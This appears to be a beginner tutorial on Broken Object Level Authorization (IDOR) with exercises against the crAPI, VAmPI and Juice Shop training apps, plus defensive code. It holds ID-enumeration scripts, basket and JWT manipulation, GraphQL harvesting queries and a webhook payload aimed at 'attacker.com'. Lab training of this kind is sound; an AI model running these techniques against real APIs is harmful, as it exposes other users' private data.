# 🔑 Broken Object Level Authorization (BOLA/IDOR) Tutorial

**Difficulty**: ⭐⭐ (Beginner)  
**Time Required**: 2 hours  
**Applications**: crAPI, VAmPI, Juice Shop

## 📚 Table of Contents
1. [What is BOLA/IDOR?](#what-is-bolaidor)
2. [How BOLA Works](#how-bola-works)
3. [Common BOLA Patterns](#common-bola-patterns)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand BOLA/IDOR vulnerabilities
- ✅ Identify API endpoints vulnerable to BOLA
- ✅ Access unauthorized resources
- ✅ Enumerate hidden objects
- ✅ Implement proper authorization checks

---

## What is BOLA/IDOR?

**BOLA** (Broken Object Level Authorization) is the #1 vulnerability in the OWASP API Security Top 10. Also known as **IDOR** (Insecure Direct Object Reference), it occurs when an API doesn't properly check if a user has permission to access a specific object.

### 🎬 Real-World Impact

Major BOLA incidents:
- **Facebook (2019)**: View any user's private photos - $30,000 bounty
- **Uber (2019)**: Access any user's trip details - $5,000 bounty
- **Apple (2020)**: Access any user's iCloud account data
- **Twitter (2021)**: Access private tweets via API

### 🔍 Where BOLA Occurs

Look for endpoints with:
- 📋 User IDs in URLs: `/api/users/123`
- 🆔 Object IDs: `/api/orders/45678`
- 🔢 Sequential identifiers
- 📄 Document/file references
- 💬 Message/comment IDs

---

## How BOLA Works

### Vulnerable Code Example

```python
# BAD: No authorization check
@app.route('/api/users/<user_id>')
def get_user(user_id):
    user = db.users.find_one({"id": user_id})
    return jsonify(user)

# GOOD: Proper authorization
@app.route('/api/users/<user_id>')
@require_auth
def get_user(user_id, current_user):
    # Check if user can access this resource
    if current_user.id != user_id and not current_user.is_admin:
        return {"error": "Unauthorized"}, 403
    
    user = db.users.find_one({"id": user_id})
    return jsonify(user)
```

### Attack Flow

1. **Attacker** logs in as User A (ID: 100)
2. **Attacker** accesses their own data: `/api/users/100`
3. **Attacker** changes ID to 101: `/api/users/101`
4. **Server** returns User B's private data!

---

## Common BOLA Patterns

### 1. Direct ID Reference
```
GET /api/users/123
GET /api/documents/456
GET /api/messages/789
```

### 2. Nested Resources
```
GET /api/users/123/photos/456
GET /api/organizations/123/members/456
```

### 3. Filters and Queries
```
GET /api/orders?user_id=123
GET /api/messages?recipient=123
```

### 4. Bulk Operations
```
POST /api/users/export
{"user_ids": [100, 101, 102, 103]}
```

### 5. File Access
```
GET /api/files/download?filename=user123_data.pdf
GET /api/attachments/private/document_456.docx
```

---

## Hands-On Practice

### 🏃 Exercise 1: Basic IDOR - User Profiles (crAPI)

**Setup**: Start crAPI and create two user accounts  
**Goal**: Access another user's profile data

:::hint 💡 Hint 1: Understand your own API calls
1. Log in as User A
2. Open browser Developer Tools (F12)
3. Navigate to your profile
4. Check the Network tab

What API endpoint is being called? What parameters does it use?

:::

:::hint 💡 Hint 2: Find the pattern
Look at the API request. You might see something like:
- `/api/v2/user/1`
- `/api/profile?id=1`
- `/api/users/details/1`

What happens if you change the number?

:::

:::hint 💡 Hint 3: Enumerate users
Try incrementing the ID:
- Your ID
- Your ID + 1
- Your ID - 1
- Try 1, 2, 3...

Use tools like Burp Intruder for automation!

:::

:::hint 🔓 Hint 4
**Step 1**: Identify the endpoint
```
GET /api/v2/user/dashboard
GET /api/v2/user/1
```

**Step 2**: Change the user ID
```bash
# Your request (User ID 1)
curl -H "Authorization: Bearer YOUR_TOKEN" \
     http://localhost:8888/api/v2/user/1

# Try other users
curl -H "Authorization: Bearer YOUR_TOKEN" \
     http://localhost:8888/api/v2/user/2
```

**Step 3**: Automate enumeration
```python
import requests

headers = {"Authorization": "Bearer YOUR_TOKEN"}
for user_id in range(1, 100):
    r = requests.get(f"http://localhost:8888/api/v2/user/{user_id}", 
                     headers=headers)
    if r.status_code == 200:
        print(f"User {user_id}: {r.json()}")
```

**What you'll find**: Other users' email addresses, phone numbers, and vehicle details!

:::

---

### 🏃 Exercise 2: IDOR in Vehicle Service (crAPI)

**Setup**: Use crAPI's vehicle service feature  
**Goal**: Access another user's vehicle service reports

:::hint 💡 Hint 1: Understand the service flow
1. Add a vehicle to your account
2. Contact a mechanic for service
3. View your service report

Watch the API calls - what IDs are being used?

:::

:::hint 💡 Hint 2: Multiple IDs in play
Look for:
- Vehicle ID
- Service request ID
- Report ID
- Mechanic ID

Which ones can you manipulate?

:::

:::hint 💡 Hint 3: Check different endpoints
Common patterns:
- `/api/mechanic/service_requests`
- `/api/mechanic/reports/{report_id}`
- `/api/vehicle/{vehicle_id}/services`

Try accessing reports that aren't yours!

:::

:::hint 🔓 Hint 4
**Vulnerable endpoint**:
```
GET /api/mechanic/mechanic_report?report_id=1
```

**Attack**:
```bash
# Get your own report first
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "http://localhost:8888/api/mechanic/mechanic_report?report_id=1"

# Try other report IDs
for i in {1..50}; do
    curl -H "Authorization: Bearer YOUR_TOKEN" \
         "http://localhost:8888/api/mechanic/mechanic_report?report_id=$i"
done
```

**Bonus - Find all service requests**:
```
GET /api/mechanic/service_requests?limit=100
```

This might return ALL users' service requests, not just yours!

:::

---

### 🏃 Exercise 3: UUID IDOR (VAmPI)

**Setup**: Start VAmPI API  
**Goal**: Access books that use UUIDs instead of sequential IDs

:::hint 💡 Hint 1: UUIDs aren't random enough
Even though UUIDs look random:
- `550e8400-e29b-41d4-a716-446655440000`

They might be:
- Predictable (v1 UUIDs use timestamp + MAC)
- Enumerable (limited set)
- Leaked elsewhere in the app

:::

:::hint 💡 Hint 2: Find UUID leaks
Look for places where UUIDs are exposed:
- List endpoints
- Error messages
- Other users' public data
- Response headers
- Debug endpoints

:::

:::hint 💡 Hint 3: Brute force smartly
If UUIDs seem random:
1. Collect valid UUIDs from public endpoints
2. Look for patterns
3. Try recently created objects
4. Check if simplified IDs work (1, 2, 3)

:::

:::hint 🔓 Hint 4
**Step 1**: Get all books (including private ones)
```bash
# List endpoint might leak all UUIDs
GET /api/v1/books

# Response includes private books with UUIDs!
{
  "books": [
    {"id": "550e8400-e29b-41d4-a716-446655440000", "title": "Public Book"},
    {"id": "6ba7b810-9dad-11d1-80b4-00c04fd430c8", "title": "Private Book"}
  ]
}
```

**Step 2**: Access private books
```bash
# Try to access the private book directly
GET /api/v1/books/6ba7b810-9dad-11d1-80b4-00c04fd430c8

# If blocked, try different endpoints
GET /api/v1/users/{user_id}/books/6ba7b810-9dad-11d1-80b4-00c04fd430c8
POST /api/v1/books/download
{"book_id": "6ba7b810-9dad-11d1-80b4-00c04fd430c8"}
```

**Step 3**: Find user-specific books
```python
# If you know a user's ID, try their books
user_books = f"/api/v1/users/{user_id}/books"

# Or try the "my books" endpoint with manipulated auth
GET /api/v1/books/my
# Manipulate JWT or session to impersonate other users
```

:::

---

### 🏃 Exercise 4: Mass Assignment + IDOR (Juice Shop)

**Setup**: Use Juice Shop's basket/cart feature  
**Goal**: Manipulate other users' shopping baskets

:::hint 💡 Hint 1: How are baskets identified?
When you add items to cart:
- Is there a basket ID?
- Is it in the URL, cookie, or API request?
- Can you see the basket creation request?

:::

:::hint 💡 Hint 2: Intercept and modify
Use Burp Suite or browser tools:
1. Add item to your cart
2. Intercept the request
3. Look for `basketId` or similar
4. Try changing it!

:::

:::hint 💡 Hint 3: Create vs Access
Sometimes you can:
- Access existing baskets (IDOR)
- Force creation with specific ID (Mass Assignment)
- Bind baskets to different users

Look for PUT/POST requests!

:::

:::hint 🔓 Hint 4
**Method 1: Direct basket access**
```bash
# Your basket
GET /api/BasketItems/1

# Other baskets
GET /api/BasketItems/2
GET /api/BasketItems/3
```

**Method 2: Modify basket binding**
```bash
# When creating basket
POST /api/Baskets/
{"UserId": 2}  # Create basket for another user!

# Or update existing
PUT /api/Baskets/1
{"UserId": 2}  # Transfer basket ownership
```

**Method 3: Add items to any basket**
```bash
POST /api/BasketItems/
{
  "ProductId": 1,
  "BasketId": 2,  # Someone else's basket!
  "quantity": 100
}
```

**Advanced: Chain with coupon codes**
```bash
# Find all baskets
for i in {1..100}; do
  curl "http://localhost:3001/api/BasketItems/$i"
done

# Apply coupon to someone else's basket
PUT /api/BasketItems/apply-coupon
{"basketId": 2, "coupon": "DISCOUNT90"}
```

:::

---

### 🏃 Challenge: BOLA in Modern APIs

**Goal**: Exploit BOLA in GraphQL and REST APIs with complex authorization

:::hint 🎯 Hint 1
Modern APIs might use:
1. GraphQL with nested queries
2. JWT tokens with claims
3. Role-based access control
4. Multi-tenant systems

Can you still find BOLA?

:::

:::hint 💡 Hint 2
GraphQL queries can be nested:
```graphql
query {
  user(id: "OTHER_USER_ID") {
    email
    orders {
      items
      payment {
        creditCard
      }
    }
  }
}
```

Try deep nesting and aliases!

:::

:::hint 🔓 Hint 3
**GraphQL BOLA exploitation**:
```graphql
# Alias to get multiple users
query {
  me: user(id: "MY_ID") { email }
  victim1: user(id: "1") { email, phone }
  victim2: user(id: "2") { email, phone }
  victim3: user(id: "3") { email, phone }
}

# Nested BOLA
query {
  organization(id: "1") {
    members {
      user {
        email
        salary  # Sensitive data!
      }
    }
  }
}
```

**JWT manipulation**:
```python
# Decode JWT
import jwt
token = "eyJ..."
decoded = jwt.decode(token, options={"verify_signature": False})

# Change user_id claim
decoded['user_id'] = "2"
decoded['sub'] = "2"

# Some apps don't verify properly!
```

**Multi-tenant BOLA**:
```bash
# Headers might control tenant
GET /api/users/1
X-Tenant-ID: victim-company

# Or in the URL
GET /api/t/tenant1/users/1
# Try: /api/t/tenant2/users/1
```

**Webhook/callback URLs**:
```json
POST /api/webhooks
{
  "url": "http://attacker.com",
  "user_id": "2",  # Subscribe to another user's events!
  "events": ["payment.complete", "order.shipped"]
}
```

:::

---

## Defense Strategies

### 🛡️ Proper Authorization Checks

**Function-Level Authorization**:
```python
def check_ownership(user_id, resource):
    if resource.owner_id != user_id:
        raise Forbidden()
    return True

@app.route('/api/orders/<order_id>')
@require_auth
def get_order(order_id, current_user):
    order = Order.get(order_id)
    check_ownership(current_user.id, order)
    return jsonify(order)
```

**Object-Level Authorization**:
```javascript
// Middleware approach
const checkResourceOwnership = async (req, res, next) => {
  const resource = await Resource.findById(req.params.id);
  
  if (!resource) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  if (resource.userId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  req.resource = resource;
  next();
};

app.get('/api/resources/:id', authenticate, checkResourceOwnership, (req, res) => {
  res.json(req.resource);
});
```

### 🛡️ Best Practices

1. **Use UUIDs** (but don't rely on obscurity)
```python
import uuid
resource.id = str(uuid.uuid4())
```

2. **Implement Access Control Lists (ACL)**
```python
class ACL:
    def can_read(self, user, resource):
        return (
            user.id == resource.owner_id or
            user.id in resource.shared_with or
            user.role == 'admin'
        )
```

3. **Validate at Multiple Levels**
```python
# Database query level
orders = Order.query.filter_by(user_id=current_user.id)

# Application level
if order.user_id != current_user.id:
    abort(403)

# API gateway level
rate_limit_by_user(current_user.id)
```

4. **Log Access Attempts**
```python
def log_access(user_id, resource_id, allowed):
    logger.info(f"Access attempt: user={user_id}, resource={resource_id}, allowed={allowed}")
```

---

## 📊 BOLA Testing Checklist

### Enumeration Techniques
- [ ] Sequential IDs (1, 2, 3...)
- [ ] UUID patterns
- [ ] Timestamp-based IDs
- [ ] Encoded IDs (base64, hex)
- [ ] Composite IDs (user-resource)

### Testing Locations
- [ ] URL path parameters
- [ ] Query string parameters
- [ ] Request body
- [ ] Headers (X-User-ID, etc.)
- [ ] JWT claims
- [ ] GraphQL queries

### Advanced Techniques
- [ ] Mass assignment + IDOR
- [ ] Second-order IDOR
- [ ] Blind IDOR (timing/behavior)
- [ ] IDOR in webhooks/callbacks
- [ ] File path traversal + IDOR

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify BOLA-vulnerable endpoints
- [ ] Enumerate object identifiers
- [ ] Access unauthorized resources
- [ ] Exploit BOLA in different API types
- [ ] Implement proper authorization

---

## Additional Resources

### 🔧 Tools
- **Autorize**: Burp extension for authorization testing
- **AuthMatrix**: Authorization testing framework
- **OWASP ZAP**: With authorization testing plugins
- **Postman**: Collection runner for IDOR testing

### 📖 Further Reading
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
- [IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

### 🎥 Video Resources
- [NahamSec - IDOR Hunting](https://www.youtube.com/watch?v=HrEm_S96mTc)
- [STÖK - API Security Testing](https://www.youtube.com/watch?v=xqrN4Vg7-mA)

---

**Next Tutorial**: [JWT Vulnerabilities](jwt.md) → 